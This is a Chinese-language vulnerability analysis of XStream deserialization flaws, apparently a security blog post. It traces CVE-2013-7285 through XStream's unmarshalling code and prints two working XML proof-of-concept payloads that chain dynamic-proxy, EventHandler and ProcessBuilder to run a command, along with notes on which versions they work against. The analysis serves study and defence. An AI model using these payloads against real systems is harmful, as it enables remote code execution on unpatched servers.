> 原文链接: https://www.anquanke.com//post/id/248029 


# Java安全之 Xstream 漏洞分析


                                阅读量   
                                **29459**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t0193c001f6916e9015.png)](https://p5.ssl.qhimg.com/t0193c001f6916e9015.png)



## 0x00 前言

好久没写漏洞分析文章了，最近感觉在审代码的时候，XStream 组件出现的频率比较高，借此来学习一波XStream的漏洞分析。



## 0x01 XStream 历史漏洞

下面罗列一下XStream历史漏洞

|XStream 远程代码执行漏洞|CVE-2013-7285|XStream &lt;= 1.4.6
|------
|XStream XXE|[CVE-2016-3674](https://x-stream.github.io/CVE-2016-3674.html)|`XStream` &lt;= 1.4.8
|XStream 远程代码执行漏洞|CVE-2019-10173|`XStream` &lt; 1.4.10
|XStream 远程代码执行漏洞|[CVE-2020-26217](https://x-stream.github.io/CVE-2020-26217.html)|`XStream` &lt;= 1.4.13
|XStream 远程代码执行漏洞|[CVE-2021-21344](https://x-stream.github.io/CVE-2021-21344.html)|`XStream`: &lt;= 1.4.15
|XStream 远程代码执行漏洞|[CVE-2021-21345](https://x-stream.github.io/CVE-2021-21345.html)|`XStream`: &lt;= 1.4.15
|XStream 远程代码执行漏洞|[CVE-2021-21346](https://x-stream.github.io/CVE-2021-21346.html)|`XStream`: &lt;= 1.4.15
|XStream 远程代码执行漏洞|[CVE-2021-21347](https://x-stream.github.io/CVE-2021-21347.html)|`XStream`&lt;= 1.4.15
|XStream 远程代码执行漏洞|[CVE-2021-21350](https://x-stream.github.io/CVE-2021-21350.html)|`XStream`: &lt;= 1.4.15
|XStream 远程代码执行漏洞|[CVE-2021-21351](https://x-stream.github.io/CVE-2021-21351.html)|`XStream`: &lt;= 1.4.15
|XStream 远程代码执行漏洞|[CVE-2021-29505](https://x-stream.github.io/CVE-2021-29505.html)|`XStream`: &lt;= 1.4.16

详细可查看[XStream 官方地址](https://x-stream.github.io/security.html)



## 0x02 XStream 使用与解析

### <a class="reference-link" name="%E4%BB%8B%E7%BB%8D"></a>介绍

XStream是一套简洁易用的开源类库，用于将Java对象序列化为XML或者将XML反序列化为Java对象，是Java对象和XML之间的一个双向转化器。

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8"></a>使用

#### <a class="reference-link" name="%E5%BA%8F%E5%88%97%E5%8C%96"></a>序列化

```
public static void main(String[] args) `{`

        XStream xStream = new XStream();
        Person person = new Person();
        person.setName("xxx");
        person.setAge(22);
        String s = xStream.toXML(person);
        System.out.println(s);
    `}`
```

```
&lt;com.nice0e3.Person&gt;
  &lt;name&gt;xxx&lt;/name&gt;
  &lt;age&gt;22&lt;/age&gt;
&lt;/com.nice0e3.Person&gt;
```

#### <a class="reference-link" name="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>反序列化

```
XStream xStream = new XStream();
    String xml =
                "&lt;com.nice0e3.Person&gt;\n" +
                "  &lt;name&gt;xxx&lt;/name&gt;\n" +
                "  &lt;age&gt;22&lt;/age&gt;\n" +
                "&lt;/com.nice0e3.Person&gt;";

        Person person1 = (Person)xStream.fromXML(xml);
        System.out.println(person1);
```

结果

```
Person`{`name='xxx', age=22`}`
```

### <a class="reference-link" name="EventHandler%E7%B1%BB"></a>EventHandler类

分析前先来看到`EventHandler`类，EventHandler类是实现了`InvocationHandler`的一个类，设计本意是为交互工具提供beans，建立从用户界面到应用程序逻辑的连接。其中会查看调用的方法是否为`hashCode`、`equals`、`toString`，如果不为这三个方法则往下走，而我们的需要利用的部分在下面。`EventHandler.invoke()`—&gt;`EventHandler.invokeInternal()`—&gt;`MethodUtil.invoke()`任意反射调用。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01bb99c47f29abbe19.png)

### <a class="reference-link" name="%E7%BB%84%E6%88%90%E9%83%A8%E5%88%86"></a>组成部分

#### <a class="reference-link" name="XStream%20%E6%80%BB%E4%BD%93%E7%94%B1%E4%BA%94%E9%83%A8%E5%88%86%E7%BB%84%E6%88%90"></a>XStream 总体由五部分组成

**XStream** 作为客户端对外提供XML解析与转换的相关方法。
<li>
**AbstractDriver** 为XStream提供流解析器和编写器的创建。目前支持XML（DOM，PULL）、JSON解析器。解析器**HierarchicalStreamReader**，编写器**HierarchicalStreamWriter**（PS：**XStream**默认使用了**XppDriver**)。</li>
<li>
**MarshallingStrategy** 编组和解组策略的核心接口，两个方法：<br>
marshal：编组对象图<br>
unmarshal:解组对象图<br>**TreeUnmarshaller** 树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，`convertAnother`方法把class转化成java对象。<br>**TreeMarshaller** 树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，`convertAnother`方法把java对象转化成XML。<br>
它的抽象子类`AbstractTreeMarshallingStrategy`有抽象两个方法<br>`createUnmarshallingContext`<br>`createMarshallingContext`<br>
用来根据不同的场景创建不同的`TreeUnmarshaller`子类和`TreeMarshaller`子类，使用了**策略模式**，如`ReferenceByXPathMarshallingStrategy`创建`ReferenceByXPathUnmarshaller`，`ReferenceByIdMarshallingStrategy`创建`ReferenceByIdUnmarshaller`（PS：**XStream**默认使用`ReferenceByXPathMarshallingStrategy`
</li>
<li>
**Mapper** 映射器，XML的`elementName`通过mapper获取对应类、成员、属性的class对象。支持解组和编组，所以方法是成对存在real 和serialized，他的子类`MapperWrapper`作为装饰者，包装了不同类型映射的映射器，如`AnnotationMapper`，`ImplicitCollectionMapper`，`ClassAliasingMapper`。</li>
<li>
**ConverterLookup** 通过Mapper获取的Class对象后，接着调用`lookupConverterForType`获取对应Class的转换器，将其转化成对应实例对象。`DefaultConverterLookup`是该接口的实现类，同时实现了`ConverterRegistry`的接口，所有`DefaultConverterLookup`具备查找converter功能和注册converter功能。所有注册的转换器按一定优先级组成由**TreeSet**保存的有序集合(PS:**XStream** 默认使用了**DefaultConverterLookup**)。</li>
#### <a class="reference-link" name="Mapper%E8%A7%A3%E6%9E%90"></a>Mapper解析

根据`elementName`查找对应的Class，首先调用`realClass`方法，然后`realClass`方法会在所有包装层中一层层往下找，并还原`elementName`的信息，比如在`ClassAliasingMapper`根据`component`别名得出`Component`类，最后在`DefaultMapper`中调用`realClass`创建出Class。<br>`CachingMapper`—&gt;`SecurityMapper`—&gt;`ArrayMapper`—&gt;`ClassAliasingMapper`—&gt;`PackageAliasingMapper`—&gt;`DynamicProxyMapper`—-&gt;`DefaultMapper`

[XStream 源码解析](https://www.jianshu.com/p/387c568faf62)



## 0x03 漏洞分析

### <a class="reference-link" name="CVE-2013-7285"></a>CVE-2013-7285

#### <a class="reference-link" name="%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"></a>影响范围

1.4.x&lt;=1.4.6或1.4.10

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"></a>漏洞简介

XStream序列化和反序列化的核心是通过`Converter`转换器来将XML和对象之间进行相互的转换。

XStream反序列化漏洞的存在是因为XStream支持一个名为`DynamicProxyConverter`的转换器，该转换器可以将XML中`dynamic-proxy`标签内容转换成动态代理类对象，而当程序调用了`dynamic-proxy`标签内的`interface`标签指向的接口类声明的方法时，就会通过动态代理机制代理访问`dynamic-proxy`标签内`handler`标签指定的类方法；利用这个机制，攻击者可以构造恶意的XML内容，即`dynamic-proxy`标签内的`handler`标签指向如`EventHandler`类这种可实现任意函数反射调用的恶意类、`interface`标签指向目标程序必然会调用的接口类方法；最后当攻击者从外部输入该恶意XML内容后即可触发反序列化漏洞、达到任意代码执行的目的。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

```
public static void main(String[] args) `{`

        XStream xStream = new XStream();

        String xml =
                "&lt;sorted-set&gt;\n" +
                        "    &lt;string&gt;foo&lt;/string&gt;\n" +
                        "    &lt;dynamic-proxy&gt;\n" +
                        "        &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n" +
                        "        &lt;handler class=\"java.beans.EventHandler\"&gt;\n" +
                        "            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n" +
                        "                &lt;command&gt;\n" +
                        "                    &lt;string&gt;cmd&lt;/string&gt;\n" +
                        "                    &lt;string&gt;/C&lt;/string&gt;\n" +
                        "                    &lt;string&gt;calc&lt;/string&gt;\n" +
                        "                &lt;/command&gt;\n" +
                        "            &lt;/target&gt;\n" +
                        "            &lt;action&gt;start&lt;/action&gt;\n" +
                        "        &lt;/handler&gt;\n" +
                        "    &lt;/dynamic-proxy&gt;\n" +
                        "&lt;/sorted-set&gt;";

       xStream.fromXML(xml);

    `}`
```

一路跟踪下来代码走到`com.thoughtworks.xstream.core.TreeUnmarshaller#start`

```
public Object start(final DataHolder dataHolder) `{`
        this.dataHolder = dataHolder;
        //通过mapper获取对应节点的Class对象
        final Class&lt;?&gt; type = HierarchicalStreams.readClassType(reader, mapper);
        //Converter根据Class的类型转化成java对象
        final Object result = convertAnother(null, type);
        for (final Runnable runnable : validationList) `{`
            runnable.run();
        `}`
        return result;
    `}`
```

调用`HierarchicalStreams.readClassType`方法，从序列化的数据中获取一个真实的class对象。

```
public static Class&lt;?&gt; readClassType(final HierarchicalStreamReader reader, final Mapper mapper) `{`
        if (classAttribute == null) `{`
        // 通过节点名获取Mapper中对应的Class
        Class&lt;?&gt; type = mapper.realClass(reader.getNodeName());
        return type;
    `}`
```

方法内部调用`readClassAttribute`。来看到方法

```
public static String readClassAttribute(HierarchicalStreamReader reader, Mapper mapper) `{`
    String attributeName = mapper.aliasForSystemAttribute("resolves-to");
    String classAttribute = attributeName == null ? null : reader.getAttribute(attributeName);
    if (classAttribute == null) `{`
        attributeName = mapper.aliasForSystemAttribute("class");
        if (attributeName != null) `{`
            classAttribute = reader.getAttribute(attributeName);
        `}`
    `}`

    return classAttribute;
`}`
```

其中调用获取调用`aliasForSystemAttribute`方法获取别名。

获取`resolves-to`和`class`判断解析的xml属性值中有没有这两字段。

这里返回为空，继续来看到`com.thoughtworks.xstream.core.util.HierarchicalStreams#readClassType`

为空的话，则走到这里

```
type = mapper.realClass(reader.getNodeName());
```

获取当前节点的名称，并进行返回对应的class对象。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e942f01cee21be76.png)

跟踪`mapper.realClass`方法。`com.thoughtworks.xstream.mapper.CachingMapper#realClass`

```
public Class realClass(String elementName) `{`
        Object cached = this.realClassCache.get(elementName);
        if (cached != null) `{`
            if (cached instanceof Class) `{`
                return (Class)cached;
            `}` else `{`
                throw (CannotResolveClassException)cached;
            `}`
        `}` else `{`
            try `{`
                Class result = super.realClass(elementName);
                this.realClassCache.put(elementName, result);
                return result;
            `}` catch (CannotResolveClassException var4) `{`
                this.realClassCache.put(elementName, var4);
                throw var4;
            `}`
        `}`
    `}`
```

找到别名应的类，存储到realClassCache中，并且进行返回。

执行完成回到`com.thoughtworks.xstream.core.TreeUnmarshaller#start`中

跟进代码

```
Object result = this.convertAnother((Object)null, type);
```

来到这里

```
public Object convertAnother(final Object parent, Class&lt;?&gt; type, Converter converter) `{`
        //根据mapper获取type实现类
        type = mapper.defaultImplementationOf(type);
        if (converter == null) `{`
            //根据type找到对应的converter
            converter = converterLookup.lookupConverterForType(type);
        `}` else `{`
            if (!converter.canConvert(type)) `{`
                final ConversionException e = new ConversionException("Explicitly selected converter cannot handle type");
                e.add("item-type", type.getName());
                e.add("converter-type", converter.getClass().getName());
                throw e;
            `}`
        `}`
         // 进行把type转化成对应的object
        return convert(parent, type, converter);
    `}`
```

`this.mapper.defaultImplementationOf`方法会在mapper对象中去寻找接口的实现类

[![](https://p2.ssl.qhimg.com/t0163fad4efea3aa92c.png)](https://p2.ssl.qhimg.com/t0163fad4efea3aa92c.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cd35f461100529bc.png)

下面调用`this.converterLookup.lookupConverterForType(type);`方法寻找对应类型的转换器。

```
public Converter lookupConverterForType(final Class&lt;?&gt; type) `{`
        //先查询缓存的类型对应的转换器集合
        final Converter cachedConverter = type != null ? typeToConverterMap.get(type.getName()) : null;
        if (cachedConverter != null) `{`
            //返回找到的缓存转换器
            return cachedConverter;
        `}`

        final Map&lt;String, String&gt; errors = new LinkedHashMap&lt;&gt;();
        //遍历转换器集合
        for (final Converter converter : converters) `{`
            try `{`
                //判断是不是符合的转换器
                if (converter.canConvert(type)) `{`
                    if (type != null) `{`
                        //缓存类型对应的转换器
                        typeToConverterMap.put(type.getName(), converter);
                    `}`
                    //返回找到的转换器
                    return converter;
                `}`
            `}` catch (final RuntimeException | LinkageError e) `{`
                errors.put(converter.getClass().getName(), e.getMessage());
            `}`
        `}`
`}`
```

canConvert 变量所有转换器，通过调用`Converter.canConvert()`方法来匹配转换器是否能够转换出`TreeSet`类型，这里找到满足条件的`TreeSetConverter`转换器

下面则是调用`this.typeToConverterMap.put(type, converter);`将该类和转换器存储到map中。

然后将转换器进行返回。

回到`com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother`中，执行来到这里。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019b49bf05280d19fb.png)

```
protected Object convert(Object parent, Class type, Converter converter) `{`
        Object result;
        if (this.parentStack.size() &gt; 0) `{`
            result = this.parentStack.peek();
            if (result != null &amp;&amp; !this.values.containsKey(result)) `{`
                this.values.put(result, parent);
            `}`
        `}`

        String attributeName = this.getMapper().aliasForSystemAttribute("reference");
        String reference = attributeName == null ? null : this.reader.getAttribute(attributeName);
        Object cache;
        if (reference != null) `{`
            cache = this.values.get(this.getReferenceKey(reference));
            if (cache == null) `{`
                ConversionException ex = new ConversionException("Invalid reference");
                ex.add("reference", reference);
                throw ex;
            `}`

            result = cache == NULL ? null : cache;
        `}` else `{`
            cache = this.getCurrentReferenceKey();
            this.parentStack.push(cache);
            result = super.convert(parent, type, converter);
            if (cache != null) `{`
                this.values.put(cache, result == null ? NULL : result);
            `}`

            this.parentStack.popSilently();
        `}`

        return result;
    `}`
```

获取reference别名后，从xml中获取reference标签内容。获取为空则调用

`this.getCurrentReferenceKey()`来获取当前标签将当前标签。

调用`this.types.push`将获取的值压入栈中，跟进查看一下。

```
public Object push(Object value) `{`
        if (this.pointer + 1 &gt;= this.stack.length) `{`
            this.resizeStack(this.stack.length * 2);
        `}`

        this.stack[this.pointer++] = value;
        return value;
    `}`
```

实际上做的操作也只是将值存储在了`this.stack`变量里面。

来到以下代码

```
Object result = converter.unmarshal(this.reader, this);
```

调用传递进来的类型转换器，也就是前面通过匹配获取到的类型转换器。调用`unmarshal`方法，进行xml解析。也就是`com.thoughtworks.xstream.converters.collections.TreeSetConverter#unmarshal`

```
public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) `{`
    TreeSet result = null;
    Comparator unmarshalledComparator = this.treeMapConverter.unmarshalComparator(reader, context, (TreeMap)null);
    boolean inFirstElement = unmarshalledComparator instanceof Null;
    Comparator comparator = inFirstElement ? null : unmarshalledComparator;
    TreeMap treeMap;
    if (sortedMapField != null) `{`
        TreeSet possibleResult = comparator == null ? new TreeSet() : new TreeSet(comparator);
        Object backingMap = null;

        try `{`
            backingMap = sortedMapField.get(possibleResult);
        `}` catch (IllegalAccessException var11) `{`
            throw new ConversionException("Cannot get backing map of TreeSet", var11);
        `}`

        if (backingMap instanceof TreeMap) `{`
            treeMap = (TreeMap)backingMap;
            result = possibleResult;
        `}` else `{`
            treeMap = null;
        `}`
    `}` else `{`
        treeMap = null;
    `}`

    if (treeMap == null) `{`
        PresortedSet set = new PresortedSet(comparator);
        result = comparator == null ? new TreeSet() : new TreeSet(comparator);
        if (inFirstElement) `{`
            this.addCurrentElementToCollection(reader, context, result, set);
            reader.moveUp();
        `}`

        this.populateCollection(reader, context, result, set);
        if (set.size() &gt; 0) `{`
            result.addAll(set);
        `}`
    `}` else `{`
        this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);
    `}`

    return result;
`}`
```

调用`unmarshalComparator`方法判断是否存在comparator，如果不存在，则返回NullComparator对象。

```
protected Comparator unmarshalComparator(HierarchicalStreamReader reader, UnmarshallingContext context, TreeMap result) `{`
    Comparator comparator;
    if (reader.hasMoreChildren()) `{`
        reader.moveDown();
        if (reader.getNodeName().equals("comparator")) `{`
            Class comparatorClass = HierarchicalStreams.readClassType(reader, this.mapper());
            comparator = (Comparator)context.convertAnother(result, comparatorClass);
        `}` else `{`
            if (!reader.getNodeName().equals("no-comparator")) `{`
                return NULL_MARKER;
            `}`

            comparator = null;
        `}`

        reader.moveUp();
    `}` else `{`
        comparator = null;
    `}`

    return comparator;
`}`
```

回到`com.thoughtworks.xstream.converters.collections.TreeSetConverter#unmarshal`

获取为空，则`inFirstElement`为false,下面的代码`comparator`变量中三目运算返回null。而`possibleResult`也是创建的是一个空的`TreeSet`对象。而后则是一些赋值，就没必要一一去看了。来看到重点部分。

```
this.treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);
```

跟进一下。

```
protected void populateTreeMap(HierarchicalStreamReader reader, UnmarshallingContext context, TreeMap result, Comparator comparator) `{`
        boolean inFirstElement = comparator == NULL_MARKER;
        if (inFirstElement) `{`
            comparator = null;
        `}`

        SortedMap sortedMap = new PresortedMap(comparator != null &amp;&amp; JVM.hasOptimizedTreeMapPutAll() ? comparator : null);
        if (inFirstElement) `{`
            this.putCurrentEntryIntoMap(reader, context, result, sortedMap);
            reader.moveUp();
        `}`

        this.populateMap(reader, context, result, sortedMap);

        try `{`
            if (JVM.hasOptimizedTreeMapPutAll()) `{`
                if (comparator != null &amp;&amp; comparatorField != null) `{`
                    comparatorField.set(result, comparator);
                `}`

                result.putAll(sortedMap);
            `}` else if (comparatorField != null) `{`
                comparatorField.set(result, sortedMap.comparator());
                result.putAll(sortedMap);
                comparatorField.set(result, comparator);
            `}` else `{`
                result.putAll(sortedMap);
            `}`

        `}` catch (IllegalAccessException var8) `{`
            throw new ConversionException("Cannot set comparator of TreeMap", var8);
        `}`
    `}`
```

下面调用了`this.putCurrentEntryIntoMap`跟进查看一下。

[![](https://p5.ssl.qhimg.com/t010712d2df9f95cf04.png)](https://p5.ssl.qhimg.com/t010712d2df9f95cf04.png)

读取标签内的内容并缓存到target这个Map中。

`reader.moveUp()`往后解析xml

然后调用`this.populateMap(reader, context, result, sortedMap);`

跟进方法查看

```
protected void populateMap(HierarchicalStreamReader reader, UnmarshallingContext context, Map map, final Map target) `{`
                TreeSetConverter.this.populateCollection(reader, context, new AbstractList() `{`
                    public boolean add(Object object) `{`
                        return target.put(object, object) != null;
                    `}`

                    public Object get(int location) `{`
                        return null;
                    `}`

                    public int size() `{`
                        return target.size();
                    `}`
                `}`);
            `}`
```

其中调用`populateCollection`用来循环遍历子标签中的元素并添加到集合中。

调用`addCurrentElementToCollection`—&gt;`readItem`

```
protected Object readItem(HierarchicalStreamReader reader, UnmarshallingContext context, Object current) `{`
        Class type = HierarchicalStreams.readClassType(reader, this.mapper());
        return context.convertAnother(current, type);
    `}`
```

读取标签内容，并且获取转换成对应的类，最后将类添加到targer中。

[![](https://p1.ssl.qhimg.com/t0123ec9b7b5794fe7d.png)](https://p1.ssl.qhimg.com/t0123ec9b7b5794fe7d.png)

跟踪一下看看。大概流程和前面的一样。

[![](https://p2.ssl.qhimg.com/t01a0e60a6c66759f65.png)](https://p2.ssl.qhimg.com/t01a0e60a6c66759f65.png)

[![](https://p0.ssl.qhimg.com/t01dd9b1d063291a34c.png)](https://p0.ssl.qhimg.com/t01dd9b1d063291a34c.png)

[![](https://p4.ssl.qhimg.com/t013e521500629fe03a.png)](https://p4.ssl.qhimg.com/t013e521500629fe03a.png)

[![](https://p1.ssl.qhimg.com/t011b41ab7839fc2ee0.png)](https://p1.ssl.qhimg.com/t011b41ab7839fc2ee0.png)

一路跟踪来到

`com.thoughtworks.xstream.converters.extended.DynamicProxyConverter#unmarshal`

前面获得的`DynamicProxyConverter`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0127bc9e18698b1526.png)

这就获取到了一个动态代理的类。EventHandler

[![](https://p4.ssl.qhimg.com/t01f1ef57f80056c6ff.png)](https://p4.ssl.qhimg.com/t01f1ef57f80056c6ff.png)

`com.thoughtworks.xstream.converters.collections.TreeMapConverter#populateTreeMap`中调用`result.putAll`，也就是代理了`EventHandler`类的putALL。动态代理特性则会触发，`EventHandler.invoke`。

[![](https://p1.ssl.qhimg.com/t0140b47af3e3f7ef66.png)](https://p1.ssl.qhimg.com/t0140b47af3e3f7ef66.png)

invoke的主要实现逻辑在`invokeInternal`

[![](https://p0.ssl.qhimg.com/t018056869e8f66ceb7.png)](https://p0.ssl.qhimg.com/t018056869e8f66ceb7.png)

[![](https://p4.ssl.qhimg.com/t01a1ebd6f192b69739.png)](https://p4.ssl.qhimg.com/t01a1ebd6f192b69739.png)

[![](https://p1.ssl.qhimg.com/t01ba414e7e7e59061b.png)](https://p1.ssl.qhimg.com/t01ba414e7e7e59061b.png)

怎么说呢，整体一套流程其实就是一个解析的过程。从`com.thoughtworks.xstream.core.TreeUnmarshaller#start`方法开始解析xml，调用`HierarchicalStreams.readClassType`通过标签名获取Mapper中对于的class对象。获取class完成后调用`com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother`,该方法会根据class转换为对于的Java对象。`convertAnother`的实现是`mapper.defaultImplementationOf`方法查找class实现类。根据实现类获取对应转换器，获取转换器部分的实现逻辑是`ConverterLookup`中的`lookupConverterForType`方法,先从缓存集合中查找`Converter`,遍历`converters`找到符合的`Converter`。随后，调用`convert`返回object对象。`convert`方法实现逻辑是调用获取到的`converter`转换器的`unmarshal`方法来根据获取的对象，继续读取子节点，并转化成对象对应的变量。直到读取到最后一个节点退出循环。最终获取到java对象中的变量值也都设置，整个XML解析过程就结束了。

### <a class="reference-link" name="POC2"></a>POC2

```
&lt;tree-map&gt;
    &lt;entry&gt;
        &lt;string&gt;fookey&lt;/string&gt;
        &lt;string&gt;foovalue&lt;/string&gt;
    &lt;/entry&gt;
    &lt;entry&gt;
        &lt;dynamic-proxy&gt;
            &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;
            &lt;handler class="java.beans.EventHandler"&gt;
                &lt;target class="java.lang.ProcessBuilder"&gt;
                    &lt;command&gt;
                        &lt;string&gt;calc.exe&lt;/string&gt;
                    &lt;/command&gt;
                &lt;/target&gt;
                &lt;action&gt;start&lt;/action&gt;
            &lt;/handler&gt;
        &lt;/dynamic-proxy&gt;
        &lt;string&gt;good&lt;/string&gt;
    &lt;/entry&gt;
&lt;/tree-map&gt;
```

我们第一个payload使用的是`sortedset`接口在`com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother`方法中`this.mapper.defaultImplementationOf(type);`

寻找到的实现类为`java.util.TreeSet`。根据实现类寻找到的转换器即`TreeSetConverter`。

这里使用的是`tree-map`,获取的实现类是他本身，转换器则是`TreeMapConverter`。同样是通过动态代理的map对象，调用putAll方法触发到`EventHandler.invoke`里面实现任意反射调用。

### <a class="reference-link" name="1.3.1%E7%89%88%E6%9C%AC%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8%E5%8E%9F%E5%9B%A0"></a>1.3.1版本无法利用原因

`com.thoughtworks.xstream.core.util.HierarchicalStreams#readClassType`

[![](https://p5.ssl.qhimg.com/t01a208226829f4bcc8.png)](https://p5.ssl.qhimg.com/t01a208226829f4bcc8.png)

该行代码爆出`Method threw 'com.thoughtworks.xstream.mapper.CannotResolveClassException' exception.`无法解析异常。

发现是从遍历去调用map,调用realClass查找这里并没有从map中找到对应的class。所以这里报错了。

### <a class="reference-link" name="1.4.7-1.4.9%E7%89%88%E6%9C%AC%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8%E5%8E%9F%E5%9B%A0"></a>1.4.7-1.4.9版本无法利用原因

`com.thoughtworks.xstream.core.TreeUnmarshaller#start`

```
Class type = HierarchicalStreams.readClassType(this.reader, this.mapper);
Object result = this.convertAnother((Object)null, type);
```

获取class部分成功了，报错位置在调用`this.convertAnother`转换成Object对象步骤上。

跟进查看一下。

`EventHandler`的处理由`ReflectionConverter`来处理的，在1.4.7-1.4.9版本。添加了`canConvert`方法的判断。

### <a class="reference-link" name="1.4.10%E7%89%88%E6%9C%ACpayload%E5%8F%AF%E5%88%A9%E7%94%A8%E5%8E%9F%E5%9B%A0"></a>1.4.10版本payload可利用原因

`com.thoughtworks.xstream.converters.reflection.ReflectionConverter#canConvert`中没了对`EventHandler`类的判断。

[![](https://p2.ssl.qhimg.com/t01216605f81aa629de.png)](https://p2.ssl.qhimg.com/t01216605f81aa629de.png)

1.4.10版本以后添加了`XStream.setupDefaultSecurity(xStream)`方法的支持。

`com.thoughtworks.xstream.XStream$InternalBlackList#canConvert`中

```
public boolean canConvert(Class type) `{`
            return type == Void.TYPE || type == Void.class || XStream.this.insecureWarning &amp;&amp; type != null &amp;&amp; (type.getName().equals("java.beans.EventHandler") || type.getName().endsWith("$LazyIterator") || type.getName().startsWith("javax.crypto."));
        `}`
```

添加黑名单判断。



## 0x04 结尾

篇章略长，分开几部分来写。
